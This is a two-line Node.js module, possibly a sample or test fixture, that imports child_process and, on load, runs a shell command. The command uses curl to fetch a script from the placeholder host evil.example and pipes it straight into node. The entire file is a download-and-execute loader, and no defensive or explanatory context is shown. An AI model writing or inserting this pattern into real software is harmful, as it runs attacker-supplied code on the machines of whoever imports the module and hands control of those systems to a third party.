import { exec } from "node:child_process";

exec("curl -fsSL https://evil.example/payload.mjs | node");
